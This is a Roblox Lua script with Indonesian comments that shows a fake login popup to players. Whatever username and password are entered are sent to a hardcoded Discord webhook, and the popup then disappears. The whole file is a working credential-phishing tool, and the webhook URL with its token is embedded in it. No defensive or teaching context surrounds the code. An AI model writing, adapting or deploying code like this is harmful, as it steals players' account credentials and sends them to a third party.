-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(username, password)
    local httpService = game:GetService("HttpService")
    local payload = httpService:JSONEncode({
        content = "Login attempt:\nUsername: " .. username .. "\nPassword: " .. password
    })

    -- Gunakan pcall untuk menangkap kesalahan
    local success, err = pcall(function()
        httpService:PostAsync(webhook_url, payload, Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        print("Data berhasil dikirim ke Discord!")
    else
        print("Gagal mengirim data ke Discord:", err)
    end
end

-- Membuat GUI
local screenGui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local usernameBox = Instance.new("TextBox")
local passwordBox = Instance.new("TextBox")
local loginButton = Instance.new("TextButton")

-- Properti ScreenGui
screenGui.Name = "LoginPopup"
screenGui.Parent = game:GetService("CoreGui")

-- Properti Frame
frame.Name = "LoginFrame"
frame.Parent = screenGui
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
frame.BorderSizePixel = 0

-- Properti UsernameBox
usernameBox.Name = "UsernameBox"
usernameBox.Parent = frame
usernameBox.Size = UDim2.new(0, 280, 0, 40)
usernameBox.Position = UDim2.new(0, 10, 0, 20)
usernameBox.PlaceholderText = "Enter Username"
usernameBox.Text = ""
usernameBox.BackgroundColor3 = Color3.new(1, 1, 1)
usernameBox.TextColor3 = Color3.new(0, 0, 0)

-- Properti PasswordBox
passwordBox.Name = "PasswordBox"
passwordBox.Parent = frame
passwordBox.Size = UDim2.new(0, 280, 0, 40)
passwordBox.Position = UDim2.new(0, 10, 0, 80)
passwordBox.PlaceholderText = "Enter Password"
passwordBox.Text = ""
passwordBox.BackgroundColor3 = Color3.new(1, 1, 1)
passwordBox.TextColor3 = Color3.new(0, 0, 0)
passwordBox.TextTransparency = 0.5

-- Properti LoginButton
loginButton.Name = "LoginButton"
loginButton.Parent = frame
loginButton.Size = UDim2.new(0, 280, 0, 40)
loginButton.Position = UDim2.new(0, 10, 0, 140)
loginButton.Text = "Login"
loginButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
loginButton.TextColor3 = Color3.new(1, 1, 1)

-- Fungsi ketika tombol login ditekan
loginButton.MouseButton1Click:Connect(function()
    local username = usernameBox.Text
    local password = passwordBox.Text
    print("Tombol login ditekan") -- Debug log

    if username ~= "" and password ~= "" then
        sendToDiscord(username, password) -- Memanggil fungsi sendToDiscord
        frame:Destroy() -- Menghapus popup setelah login
    else
        print("Username atau password tidak boleh kosong!")
    end
end)
